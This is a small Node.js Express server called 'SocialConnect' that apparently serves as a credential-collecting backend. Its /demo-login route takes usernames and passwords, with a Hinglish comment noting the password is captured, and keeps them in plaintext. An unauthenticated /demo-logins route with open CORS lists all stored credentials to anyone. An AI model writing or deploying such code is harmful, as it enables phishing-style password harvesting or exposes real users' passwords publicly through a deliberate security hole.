const express = require("express");
const app = express();

const PORT = process.env.PORT || 3000;

app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");

  if (req.method === "OPTIONS") {
    return res.sendStatus(204);
  }

  next();
});

app.use(express.json());

let demoUsernames = [];

app.get("/", (req, res) => {
  res.send("SocialConnect Backend is running!");
});

app.get("/health", (req, res) => {
  res.json({ status: "ok" });
});

// Receive a demo username and password
app.post("/demo-login", (req, res) => {
  const username = String(req.body.username || "").trim();
  const password = String(req.body.password || "").trim(); // Password capture kiya

  if (!username || username.length > 50) {
    return res.status(400).json({
      message: "Enter a username up to 50 characters."
    });
  }

  if (!password) {
    return res.status(400).json({
      message: "Password is required."
    });
  }

  // Username aur Password dono array me push honge
  demoUsernames.push({
    username: username,
    password: password,
    time: new Date().toISOString()
  });

  res.json({
    message: "Demo username and password received!"
  });
});

// View submitted demo usernames and passwords
app.get("/demo-logins", (req, res) => {
  res.json(demoUsernames);
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`SocialConnect server running on port ${PORT}`);
});
